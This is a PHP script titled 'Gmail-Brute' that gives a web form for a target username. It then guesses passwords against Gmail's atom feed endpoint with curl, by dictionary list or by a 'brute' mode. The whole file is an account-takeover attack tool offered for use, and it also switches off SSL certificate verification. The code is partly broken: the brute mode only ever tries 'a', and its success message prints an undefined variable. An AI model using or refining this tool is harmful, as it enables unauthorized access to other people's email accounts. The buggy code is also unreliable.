<?php
//////////////////////
////Gmail-Brute//////
///////////////////////
 
 
 
////////////////////////
# This script was created to Brute Force G-Mail Logins,#
#it Uses CURL and 2 Methods of Login attacks (Brute Force and Dictionary) #
////////////////////////
 
$dic ="your Dictionary file here.txt";
///////////////////////
 
 
 
echo "
<title>Gmail Brute Force Attacker</title>
</head>
<style type='text/css'>
body {
 
 
font:Verdana, Arial, Helvetica, sans-serif;
font-size:12px;
border-color:#FFFFFF;
}
.raster_table {
background-color:#444444;
border-color:#CCCCCC;
}
.alert {
   color:#FF0000;
}
</style>
<body>
<table cellpadding='0' cellspacing='0' align='center' class='raster_table' width='75%'>
<tr>
<td>
<div align='center'><b>Gmail Brute Force Attacker</b></div>
       </td>
   </tr>
</table>
<table cellpadding='0' cellspacing='0' align='center' class='raster_table' width='75%'>
   <tr>
       <td>
           <div align='center'>
 
           </div>
       </td>
   </tr>
   <tr>
       <td>
           <div align='center'>
           
           </div>
       </td>
   </tr>
   <tr>
       <td>
           <div align='center'>
               <form method='post'>
                   Username to brute:<br>
                   <input name='username' type='text' /><br><br>
                   <input name='attack' type='submit' value='dictionary' /> - <input name='attack' type='submit' value='brute' /><br>
               </form>
           </div>
       </td>
   </tr>
   <tr>
       <td>
           <div align='center'>
           
           </div>
       </td>
   </tr>
</table>
";
// Sets variables and retrives google error for comparing
if(isset($_POST['attack']) && isset($_POST['username'])) {
    $username = $_POST['username'];
    $headers = array(
    "Host: mail.google.com",
    "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4",
    "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
    "Accept-Language: en-us,en;q=0.5",
    "Accept-Encoding: text", # No gzip, it only clutters your code!
   "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
    "Date: ".date(DATE_RFC822)
    );
    $c = curl_init('https://mail.google.com/mail/feed/atom');
    curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
    curl_setopt($c, CURLOPT_HTTPHEADER, $headers); // send the headers
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 1);
    curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
    $wrong = curl_exec($c); // Get it
    curl_close($c); // Close the curl stream
}
//Dictionary Attack
if($_POST['attack'] == "dictionary") {
    $Dictionary = file("$dic");
    for ($Position = 0; $Position < count($Dictionary); $Position++) {
        $Dictionary[$Position] = str_replace("rn", "", $Dictionary[$Position]);
        if(check_correct($username, $Dictionary[$Position])) {
            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
   <tr>
       <td>
           <div align='center'><b>Found the password of: ".$Dictionary[$Position]."<br> For the account: ".$username."</b></div>
       </td>
   </tr>
</table>
</body>
</html>");
        }
    }
    echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
   <tr>
       <td>
           <div align='center'><b>Sorry... a password was not found for the account of <span class='alert'>".$username."</span> during the dictionar
y attack.</b></div>
       </td>
   </tr>
</table>";
}
//Brute Attack
elseif($_POST['attack'] == "brute") {
    for ($Pass = 0; $Pass < 2; $Pass++) {
        if ($Pass == 0){$Pass = "a";} elseif ($Pass == 1){ $Pass = "a"; }
        if(check_correct($username, $Pass)) {
            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
   <tr>
       <td>
           <div align='center'><b>Found the password of: ".$Dictionary[$Position]."<br> For the account: ".$username."</b></div>
       </td>
   </tr>
</table>
</body>
</html>");
        }
    }
    echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
   <tr>
       <td>
           <div align='center'><b>Sorry... a password was not found for the account of <span class='alert'>".$username."</span> during the brute for
ce attack.</b></div>
       </td>
   </tr>
</table>";
}
echo "</body>
</html>";
// Function for checking whether the username and password are correct
function check_correct($username, $password)
{
        global $wrong, $headers;
        $c = curl_init('https://'.$username.':'.$password.'@mail.google.com/mail/feed/atom');
        curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
        curl_setopt($c, CURLOPT_HTTPHEADER, $headers); // send the headers
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 1);
        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
        $str = curl_exec($c); // Get it
        curl_close($c);
        if($str != $wrong) {return true;}
        else {return false;}
}
 
?>
